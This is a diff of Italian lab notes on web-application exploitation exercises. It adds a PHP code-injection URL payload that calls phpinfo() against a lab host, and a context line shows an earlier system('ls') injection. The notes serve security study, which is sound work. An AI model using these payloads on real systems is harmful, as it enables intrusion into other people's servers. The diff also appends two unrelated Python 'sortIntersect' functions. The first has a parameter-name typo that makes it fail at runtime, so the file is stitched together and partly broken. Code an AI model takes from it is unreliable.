@@ -630,6 +630,17 @@ http://192.168.64.6/codeexec/example3.php?new=system(%22ls%22)&pattern=/lamer/e&
 nota: non dovrebbe chiederlo  
 
 
+## Code Injection 4:
+
+Si riporta come configurare l'url per sfruttare l'expoloit di questo livello.  
+
+```
+http://192.168.64.6/codeexec/example4.php?name=hacker'.phpinfo().'
+````
+
+nota: non dovrebbe chiederlo 
+
+
 ## SQL Injection 1:
 
 Nel codice sorgente della sfida notiamo che viene costruita una stringa rappresentante uno statement SQL, tale input non viene controllato in alcun modo e viene mandato ad un DBMS MySQL per l'esecuzione.  
@@ -848,3 +859,30 @@ domande:
 - esercizio 8 - serve wireshark 
 - dash e bash ??
 
+
+from collections import defaultdict 
+
+def sortIntersect(volcanic,nonvolcaninc):
+    intersection = []
+    volcanic_map = defaultdict(int)
+    for num in volcanic:
+        volcanic_map[num] += 1
+    for num in nonvolcanic:
+        if num in volcanic_map and volcanic_map[num] > 0:
+            intersection.append(num)
+            volcanic_map[num] -= 1 
+    intersection.sort(reverse=True)
+    return intersection 
+
+
+def sortIntersect(volcanic, nonVolcanic):
+    counts = {}
+    for v in volcanic:
+        counts[v] = counts.get(v, 0) + 1
+    result = []
+    for v in nonVolcanic:
+        if counts.get(v, 0) > 0:
+            result.append(v)
+            counts[v] -= 1
+    result.sort(reverse=True)
+    return result
